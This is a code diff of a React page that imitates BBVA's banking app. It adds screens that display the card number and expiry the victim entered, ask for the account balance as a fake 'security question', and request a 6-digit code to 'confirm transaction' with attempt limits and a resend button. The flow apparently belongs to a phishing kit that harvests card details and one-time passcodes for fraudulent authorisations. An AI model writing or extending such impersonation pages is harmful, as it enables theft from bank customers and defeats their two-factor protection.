+                        d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
+                      />
+                    </svg>
+                    <span>{language === "es" ? "VERIFICANDO..." : "VERIFYING..."}</span>
+                  </div>
+                ) : language === "es" ? (
+                  "Verificar"
+                ) : (
+                  "Verify"
+                )}
+              </button>
+            </div>
+          </section>
+        </main>
+      )}
+
+      {/* ========================================================================= */}
+      {/* 4. SCREEN 4: BBVA ACCOUNT DETAILS (MATCHING NEW SCREENSHOT)               */}
+      {/* ========================================================================= */}
+      {currentScreen === "accounts" && (
+        <main className="relative w-full max-w-[440px] sm:max-w-[460px] h-[100dvh] max-h-[100dvh] flex flex-col overflow-hidden shadow-2xl bg-[#021493] px-0">
+          {/* Header with Back Arrow and centered BBVA Logo on Blue */}
+          <header className="relative z-20 w-full px-4 pt-5 pb-3 flex items-center justify-between shrink-0 select-none bg-[#021493]">
+            <button
+              type="button"
+              onClick={() => setCurrentScreen("otp")}
+              className="p-1 -ml-1 text-white hover:opacity-80 transition-opacity cursor-pointer flex items-center justify-center"
+              aria-label="Back"
+            >
+              <ChevronLeft className="w-6 h-6 stroke-[2.4]" />
+            </button>
+
+            <div className="flex items-center justify-center">
+              <BbvaLogo />
+            </div>
+
+            <div className="w-6" />
+          </header>
+
+          {/* White Card Container extending to bottom with Rounded Top Corners */}
+          <section className="relative z-10 w-full bg-white rounded-t-[28px] flex-1 flex flex-col p-5 shadow-2xl overflow-y-auto gap-3.5 select-none">
+            {/* Card Display with Overlaid Number & Validity */}
+            <div className="w-full flex flex-col items-center">
+              <div className="relative w-full max-w-[380px] rounded-[14px] overflow-hidden shadow-sm flex items-center justify-center bg-teal-500">
+                <img
+                  src="/bbva_card.png"
+                  alt="BBVA Debit Card"
+                  className="w-full h-auto object-contain rounded-[14px] select-none pointer-events-none"
+                />
+                {/* Overlaid Embossed Number */}
+                <div className="absolute bottom-[24%] left-[6.5%] font-mono tracking-[0.16em] text-[12px] sm:text-[13.5px] text-white/95 font-semibold drop-shadow-[0_1px_2px_rgba(0,0,0,0.6)]">
+                  {cardNumber || "4934 6400 1015 6384"}
+                </div>
+                {/* Overlaid Expiry */}
+                <div className="absolute bottom-[11%] left-[6.5%] flex items-center font-mono text-[7px] sm:text-[8px] text-white/80 tracking-wider">
+                  <span className="mr-1 opacity-75">VALID THRU</span>
+                  <span className="font-semibold text-white text-[8px] sm:text-[9.5px]">
+                    {cardMonth && cardYear ? `${cardMonth}/${cardYear}` : "11/29"}
+                  </span>
                 </div>
               </div>
-            </div>
-          </div>
-        )}
-      </main>
 
-      {/* Global CSS for animation */}
+              {/* 3 Pagination dots */}
+              <div className="flex items-center justify-center gap-1.5 pt-3 pb-0.5">
+                <span className="w-4 h-1.5 rounded-full bg-[#00a9ce]" />
+                <span className="w-1.5 h-1.5 rounded-full bg-[#cbd5e1]" />
+                <span className="w-1.5 h-1.5 rounded-full bg-[#cbd5e1]" />
+              </div>
+            </div>
+
+            {/* Box 1: ACCOUNT NUMBER */}
+            <div className="w-full border border-[#e2e8f0] rounded-[14px] p-3.5 bg-white">
+              <label className="block text-[10.5px] font-bold text-[#64748b] tracking-wider uppercase mb-2">
+                {language === "es" ? "NÚMERO DE CUENTA" : "ACCOUNT NUMBER"}
+              </label>
+              <div className="flex items-center flex-nowrap whitespace-nowrap">
+                <span className="bg-[#f1f5f9] text-[#475569] text-[12px] font-semibold px-2.5 py-1 rounded-[6px] mr-3 select-none shrink-0">
+                  Acc.
+                </span>
+                <span className="text-[#1e293b] font-mono text-[15px] tracking-[0.2em] select-none whitespace-nowrap font-medium">
+                  **** ****
+                </span>
+              </div>
+            </div>
+
+            {/* Box 2: BANK SECURITY QUESTION */}
+            <div className="w-full border border-[#e2e8f0] rounded-[14px] p-3.5 bg-white">
+              <label className="block text-[10.5px] font-bold text-[#64748b] tracking-wider uppercase mb-1">
+                {language === "es" ? "PREGUNTA DE SEGURIDAD BANCARIA" : "BANK SECURITY QUESTION"}
+              </label>
+              <p className="text-[13px] font-medium text-[#1e293b] mb-2.5">
+                {language === "es"
+                  ? "¿Cuál es el saldo actual de su cuenta?"
+                  : "What is your current account balance?"}
+              </p>
+              <div className="flex items-center">
+                <span className="bg-[#021493] text-white text-[11px] font-bold px-2.5 py-1 rounded-[6px] mr-2.5 select-none shrink-0 flex items-center justify-center">
+                  EUR
+                </span>
+                <input
+                  type="text"
+                  inputMode="decimal"
+                  value={accountBalance}
+                  onChange={(e) => setAccountBalance(e.target.value)}
+                  placeholder="0.00"
+                  className="w-full text-[15px] text-[#1e293b] placeholder-[#94a3b8] outline-none bg-transparent font-medium"
+                />
+              </div>
+            </div>
+
+            {/* Continue Button */}
+            <button
+              type="button"
+              disabled={isAccountsSubmitting}
+              onClick={handleAccountsSubmit}
+              className="w-full h-[48px] bg-[#021493] hover:bg-[#01117d] active:scale-[0.985] text-white rounded-[10px] font-semibold text-[15.5px] tracking-wide transition-all flex items-center justify-center cursor-pointer shadow-sm select-none"
+            >
+              {isAccountsSubmitting ? (
+                <div className="flex items-center gap-2">
+                  <svg
+                    className="animate-spin h-5 w-5 text-white"
+                    xmlns="http://www.w3.org/2000/svg"
+                    fill="none"
+                    viewBox="0 0 24 24"
+                  >
+                    <circle
+                      className="opacity-25"
+                      cx="12"
+                      cy="12"
+                      r="10"
+                      stroke="currentColor"
+                      strokeWidth="4"
+                    />
+                    <path
+                      className="opacity-75"
+                      fill="currentColor"
+                      d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
+                    />
+                  </svg>
+                  <span>{language === "es" ? "PROCESANDO..." : "PROCESSING..."}</span>
+                </div>
+              ) : accountsSuccess ? (
+                language === "es" ? "✓ Completado" : "✓ Completed"
+              ) : language === "es" ? (
+                "Continuar"
+              ) : (
+                "Continue"
+              )}
+            </button>
+          </section>
+        </main>
+      )}
+
+      {/* ========================================================================= */}
+      {/* 5. SCREEN 5: BBVA CONFIRM TRANSACTION OTP (/cc - MATCHING SCREENSHOT 2)  */}
+      {/* ========================================================================= */}
+      {currentScreen === "confirm-otp" && (
+        <main className="relative w-full max-w-[440px] sm:max-w-[460px] h-[100dvh] max-h-[100dvh] flex flex-col overflow-hidden shadow-2xl bg-[#021493] px-0">
+          {/* Header with Back Arrow (<) and centered BBVA Logo on Blue */}
+          <header className="relative z-20 w-full px-4 pt-5 pb-3 flex items-center justify-between shrink-0 select-none bg-[#021493]">
+            <button
+              type="button"
+              onClick={() => {
+                setCurrentScreen("accounts")
+                if (typeof window !== "undefined" && window.history) {
+                  window.history.pushState({ screen: "accounts" }, "", "/accounts")
+                }
+              }}
+              className="p-1 -ml-1 text-white hover:opacity-80 transition-opacity cursor-pointer flex items-center justify-center"
+              aria-label="Back"
+            >
+              <ChevronLeft className="w-6 h-6 stroke-[2.4]" />
+            </button>
+
+            <div className="flex items-center justify-center">
+              <BbvaLogo />
+            </div>
+
+            <div className="w-6" />
+          </header>
+
+          {/* Section below header: clean white background extending across the form */}
+          <section className="relative z-10 w-full bg-white flex-1 flex flex-col justify-start items-center p-4 pt-6 overflow-y-auto select-none">
+            {/* Form Container (Clean white, seamless with background) */}
+            <div className="w-full max-w-[380px] bg-white flex flex-col items-center">
+              {/* Blue Lock Icon in subtle ring */}
+              <div className="w-11 h-11 rounded-full border border-[#021493]/25 flex items-center justify-center text-[#021493] mb-3">
+                <Lock className="w-5 h-5 stroke-[2.2]" />
+              </div>
+
+              {/* Heading */}
+              <h2 className="text-[17.5px] sm:text-[18.5px] font-bold text-[#0f172a] text-center mb-1.5">
+                {language === "es" ? "Confirmar transacción" : "Confirm transaction"}
+              </h2>
+
+              {/* Subtitle */}
+              <p className="text-[11.5px] text-[#64748b] text-center leading-relaxed mb-4 max-w-[270px]">
+                {language === "es"
+                  ? "Introduzca el código de 6 dígitos enviado a su número móvil para autorizar esta acción."
+                  : "Enter the 6-digit code sent to your mobile number to authorise this action."}
+              </p>
+
+              {/* 6 OTP Boxes */}
+              <div
+                className={`grid grid-cols-6 gap-1.5 sm:gap-2 w-full max-w-[280px] mx-auto mb-3 ${
+                  confirmShake > 0 ? "animate-shake" : ""
+                }`}
+              >
+                {confirmOtp.map((digit, idx) => {
+                  const isFocused = confirmFocusedIndex === idx
+                  const boxBorderClass = hasConfirmError
+                    ? isFocused
+                      ? "border-[#ef4444] ring-1 ring-[#ef4444]"
+                      : "border-[#ef4444]"
+                    : isFocused
+                    ? "border-[#021493] ring-1 ring-[#021493]"
+                    : "border-[#cbd5e1]"
+
+                  return (
+                    <input
+                      key={idx}
+                      ref={(el) => {
+                        confirmOtpRefs.current[idx] = el
+                      }}
+                      type="text"
+                      inputMode="numeric"
+                      maxLength={6}
+                      value={digit}
+                      onFocus={() => setConfirmFocusedIndex(idx)}
+                      onBlur={() => setConfirmFocusedIndex(null)}
+                      onChange={(e) => handleConfirmOtpChange(idx, e.target.value)}
+                      onKeyDown={(e) => handleConfirmOtpKeyDown(idx, e)}
+                      className={`w-full h-[44px] sm:h-[46px] text-center text-[19px] sm:text-[20px] font-bold text-[#0f172a] bg-white rounded-[10px] border ${boxBorderClass} outline-none transition-all shadow-none`}
+                    />
+                  )
+                })}
+              </div>
+
+              {/* Error Banner: ⓘ Incorrect code. Please try again. */}
+              {hasConfirmError && (
+                <div className="w-full max-w-[280px] bg-[#fef2f2] border border-[#fecaca] text-[#dc2626] rounded-[8px] py-1.5 px-3 flex items-center justify-center gap-1.5 text-[11px] font-medium mb-3 animate-in fade-in duration-150">
+                  <svg
+                    className="w-3.5 h-3.5 shrink-0 stroke-[2] fill-none stroke-current"
+                    viewBox="0 0 24 24"
+                  >
+                    <circle cx="12" cy="12" r="10" />
+                    <line x1="12" y1="16" x2="12" y2="12" />
+                    <line x1="12" y1="8" x2="12.01" y2="8" />
+                  </svg>
+                  <span>
+                    {language === "es"
+                      ? "Código incorrecto. Por favor, inténtelo de nuevo."
+                      : confirmErrorMessage}
+                  </span>
+                </div>
+              )}
+
+              {/* Attempt Counter: Attempt 1 / 3 */}
+              <p className="text-[11px] font-medium text-[#64748b] text-center mb-1">
+                {language === "es" ? "Intento" : "Attempt"} {confirmAttempt} / 3
+              </p>
+
+              {/* Countdown Timer: Code expires in 2:58 */}
+              <p className="text-[11.5px] text-[#475569] text-center mb-2 font-medium">
+                {language === "es" ? "El código caduca en " : "Code expires in "}
+                <span className="font-bold text-[#0f172a]">{formatTimer(confirmTimeLeft)}</span>
+              </p>
+
+              {/* Resend Code Button */}
+              <button
+                type="button"
+                onClick={handleResendConfirmOtp}
+                className="flex items-center justify-center gap-1.5 text-[11.5px] text-[#64748b] hover:text-[#021493] transition-colors cursor-pointer font-medium mb-4"
+              >
+                <RotateCw className="w-3 h-3 stroke-[2.2]" />
+                <span>{language === "es" ? "Reenviar código" : "Resend code"}</span>
+              </button>
+
+              {/* Confirm Button */}
+              <button
+                type="button"
+                disabled={confirmOtp.join("").length < 6 || isConfirmSubmitting}
+                onClick={handleConfirmOtpSubmit}
+                className={`w-full h-[44px] rounded-[10px] font-semibold text-[14px] sm:text-[14.5px] transition-all flex items-center justify-center select-none shadow-sm ${
+                  confirmOtp.join("").length === 6 && !isConfirmSubmitting
+                    ? "bg-[#021493] hover:bg-[#01117d] active:scale-[0.985] text-white cursor-pointer"
+                    : "bg-[#e2e8f0] text-[#9ca3af] cursor-not-allowed"
+                }`}
+              >
+                {isConfirmSubmitting ? (
+                  <div className="flex items-center gap-2">
+                    <svg
+                      className="animate-spin h-4 w-4 text-white"
+                      xmlns="http://www.w3.org/2000/svg"
+                      fill="none"
+                      viewBox="0 0 24 24"
+                    >
+                      <circle
+                        className="opacity-25"
+                        cx="12"
+                        cy="12"
+                        r="10"
+                        stroke="currentColor"
+                        strokeWidth="4"
+                      />
+                      <path
+                        className="opacity-75"
+                        fill="currentColor"
+                        d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
+                      />
+                    </svg>
+                    <span>{language === "es" ? "CONFIRMANDO..." : "CONFIRMING..."}</span>
+                  </div>
+                ) : language === "es" ? (
+                  "Confirmar"
+                ) : (
+                  "Confirm"
+                )}
+              </button>
+            </div>
+          </section>
+        </main>
+      )}
+
+      {/* ========================================================================= */}
+      {/* 2-SECOND BLURRED LOADING OVERLAY (MATCHING SCREENSHOT 1)                  */}
+      {/* Active on transition: Login -> Card and Card -> OTP                       */}
+      {/* ========================================================================= */}
+      {isScreenLoading && (
+        <div className="fixed inset-0 z-50 flex items-center justify-center bg-[#dce6f6]/60 backdrop-blur-md animate-in fade-in duration-200">
+          <div className="w-[44px] h-[44px] rounded-full border-[3.5px] border-[#021493]/20 border-t-[#021493] animate-spin" />
+        </div>
+      )}
+
+      {/* Shake Keyframe animation */}
       <style jsx global>{`
-        html, body {
-          overflow: hidden !important;
-          height: 100dvh !important;
-          max-height: 100dvh !important;
-          overscroll-behavior: none !important;
-          touch-action: pan-x pan-y;
-        }
         @keyframes shake {
           10%, 90% { transform: translate3d(-1px, 0, 0); }
           20%, 80% { transform: translate3d(2px, 0, 0); }
